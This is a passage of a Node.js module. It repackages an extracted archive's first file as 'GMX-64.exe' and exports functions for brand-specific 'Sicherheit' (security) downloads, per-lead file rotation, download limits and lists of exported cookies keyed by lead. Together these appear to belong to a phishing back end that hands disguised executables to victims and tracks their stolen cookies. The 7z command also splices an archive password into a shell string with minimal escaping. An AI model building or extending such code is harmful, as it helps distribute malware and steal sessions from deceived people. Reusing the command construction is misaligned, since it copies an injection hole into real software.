        hasFiles = tryRepairAndExtractZip(tempZip, extractDir, pass, baseDir);
      }
      if (!hasFiles) return null;
    } else {
      fs.mkdirSync(extractDir, { recursive: true });
      const sevenZ = '7z';
      const extractCmd = pass
        ? sevenZ + ' x ' + JSON.stringify(tempZip) + ' -p' + pass.replace(/"/g, '\\"') + ' -o' + JSON.stringify(extractDir) + ' -y 2>&1'
        : sevenZ + ' x ' + JSON.stringify(tempZip) + ' -o' + JSON.stringify(extractDir) + ' -y 2>&1';
      const r = spawnSync(process.platform === 'win32' ? 'cmd' : 'sh', [process.platform === 'win32' ? '/c' : '-c', extractCmd], { encoding: 'utf8', cwd: baseDir, timeout: ARCHIVE_PROCESS_TIMEOUT_MS });
      if (spawnTimedOut(r) || r.status !== 0) return null;
    }
    const entries = fs.readdirSync(extractDir, { withFileTypes: true });
    let firstFile = null;
    for (const e of entries) {
      if (e.isFile()) { firstFile = path.join(extractDir, e.name); break; }
    }
    if (!firstFile || !fs.statSync(firstFile).isFile()) return null;
    fs.mkdirSync(repackDir, { recursive: true });
    const gmxExe = path.join(repackDir, 'GMX-64.exe');
    fs.copyFileSync(firstFile, gmxExe);
    const envNew = process.env;
    const zipCmd = 'zip -j ' + JSON.stringify(outZip) + ' ' + JSON.stringify(gmxExe) + ' 2>&1';
    const zr = spawnSync(process.platform === 'win32' ? 'cmd' : 'sh', [process.platform === 'win32' ? '/c' : '-c', zipCmd], { encoding: 'utf8', env: envNew, cwd: baseDir, timeout: ARCHIVE_PROCESS_TIMEOUT_MS });
    if (spawnTimedOut(zr) || zr.status !== 0) return null;
    if (!fs.existsSync(outZip)) return null;
    return fs.readFileSync(outZip);
  } catch (e) {
    return null;
  } finally {
    try {
      const rimraf = (dir) => {
        if (!fs.existsSync(dir)) return;
        const list = fs.readdirSync(dir);
        for (const name of list) {
          const full = path.join(dir, name);
          if (fs.statSync(full).isDirectory()) rimraf(full);
          else fs.unlinkSync(full);
        }
        fs.rmdirSync(dir);
      };
      if (fs.existsSync(baseDir)) rimraf(baseDir);
    } catch (e2) {}
  }
}

module.exports = {
  init,
  ARCHIVE_PROCESS_TIMEOUT_MS,
  DOWNLOAD_KIT_BRANDS,
  normalizeStoredDownloadKey,
  resolveDownloadFileFullPath,
  normalizeDownloadKitBrand,
  downloadKitBrandFromLead,
  readDownloadFilesConfigForBrand,
  writeDownloadFilesConfigForBrand,
  readAndroidDownloadConfigForBrand,
  writeAndroidDownloadConfigForBrand,
  isWindowsDownloadFileReferenced,
  isAndroidDownloadFileReferenced,
  pickWindowsDownloadFileNameForLead,
  pickAndroidDownloadFileNameForLead,
  readDownloadFilesConfig,
  writeDownloadFilesConfig,
  readDownloadLimits,
  writeDownloadLimits,
  readDownloadCounts,
  writeDownloadCounts,
  incrementDownloadCount,
  readCookiesExported,
  readCookiesExportRaw,
  readCookiesExportedSets,
  appendCookiesExportedLeadIds,
  writeCookiesExported,
  sanitizeFilenameForHeader,
  slotFromLeadId,
  readDownloadSettings,
  writeDownloadSettings,
  readDownloadRotation,
  writeDownloadRotation,
  getSlotForLead,
  getSicherheitDownloadFile,
  getSicherheitDownloadFileByLimit,
  getSicherheitDownloadFiles,
  readAndroidDownloadConfig,
  getAndroidDownloadFile,
  getAndroidDownloadFileByLimit,
  readAndroidDownloadLimits,
  writeAndroidDownloadLimits,
  getAndroidDownloadFiles,
  writeAndroidDownloadConfig,
  spawnTimedOut,
  tryRepairAndExtractZip,
  processArchiveToGmx,
};
